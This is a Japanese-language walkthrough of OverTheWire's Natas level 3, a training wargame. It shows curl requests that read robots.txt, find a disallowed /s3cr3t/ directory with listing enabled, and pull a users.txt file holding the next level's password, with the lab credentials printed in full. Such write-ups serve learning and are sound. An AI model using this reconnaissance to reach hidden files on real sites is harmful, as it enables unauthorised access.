# NATAS3

- Username: natas3
- Password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
- URL: http://natas3.natas.labs.overthewire.org

```
$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org
```
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas3", "pass": "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14" };</script></head>
<body>
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body></html>
```
今回はディレクトリ名のヒントはないが、`Not even Google will find it this time...`とあります。  
アクセス制御のためのファイルといえば、`robots.txt`です。
```
$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/robots.txt
```
```
User-agent: *
Disallow: /s3cr3t/
```
`/s3cr3t/`というディレクトリへのアクセス制限をしていることがわかりました。  
次は、そのディレクトリにアクセスしています。
```
$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/
```
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /s3cr3t</title>
 </head>
 <body>
<h1>Index of /s3cr3t</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2016-12-20 05:15  </td><td align="right"> 40 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.10 (Debian) Server at natas3.natas.labs.overthewire.org Port 80</address>
</body></html>
```
出力から`s3cr3t`ディレクトリ内に`users.txt`というファイルがあることがわかりました。
```
$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```
```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```
テキストファイルの中にpassword(`Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`)が書いてある。
